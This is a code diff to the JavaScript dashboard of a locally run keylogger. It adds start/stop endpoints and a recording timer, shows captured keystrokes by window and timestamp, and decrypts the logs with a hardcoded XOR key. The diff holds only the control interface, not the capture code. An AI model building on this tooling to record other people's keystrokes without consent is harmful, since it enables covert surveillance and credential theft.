@@ -1,7 +1,7 @@
 let isRunning = false;
 
 async function toggleKeylogger() {
-    const url = isRunning ? 'http://127.0.0.1:5000/stop' : 'http://127.0.0.1:5000/start';
+    const url = isRunning ? 'http://127.0.0.1:5000/stop_keylogger' : 'http://127.0.0.1:5000/start_keylogger';
     try {
         const response = await fetch(url);
         const result = await response.json();
@@ -11,10 +11,38 @@ async function toggleKeylogger() {
         button.classList.toggle('stop', isRunning);
         const recordingIndicator = document.querySelector('.recording-indicator');
         recordingIndicator.style.display = isRunning ? 'flex' : 'none';
+        if (isRunning) {
+            startTimer();
+        } else {
+            stopTimer();
+        }
     } catch (error) {
         console.error('Error:', error);
         alert('Failed to toggle keylogger');
     }
+}
+
+function startTimer() {
+    const timerElement = document.getElementById('timer');
+    timerElement.textContent = '00:00';
+    timerElement.style.display = 'inline';
+    seconds = 0;
+    timerInterval = setInterval(() => {
+        seconds++;
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        timerElement.textContent = `${pad(minutes)}:${pad(remainingSeconds)}`;
+    }, 1000);
+}
+
+function stopTimer() {
+    clearInterval(timerInterval);
+    const timerElement = document.getElementById('timer');
+    timerElement.style.display = 'none';
+}
+
+function pad(number) {
+    return number < 10 ? '0' + number : number;
 }
 
 async function fetchData() {
@@ -33,7 +61,7 @@ async function fetchData() {
         const gridOptions = {
             columnDefs: [
                 { headerName: 'Window', field: 'window', filter: 'agTextColumnFilter' },
-                { headerName: 'Timestamp', field: 'timestamp', filter: 'agDateColumnFilter' },
+                { headerName: 'Timestamp', field: 'timestamp', filter: 'agTextColumnFilter' },
                 { headerName: 'Logs', field: 'logs', filter: 'agTextColumnFilter' }
             ],
             defaultColDef: {
@@ -55,8 +83,6 @@ async function fetchData() {
     }
 }
 
-document.addEventListener('DOMContentLoaded', fetchData);
-
 function xorDecrypt(hexText, key = "thisIsMyXorKey") {
     const text = hexToString(hexText);
     const keyCycle = key.repeat(Math.ceil(text.length / key.length)).slice(0, text.length);
@@ -68,3 +94,7 @@ function xorDecrypt(hexText, key = "thisIsMyXorKey") {
 function hexToString(hex) {
     return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
 }
+
+window.addEventListener('load', function() {
+    fetchData();
+});
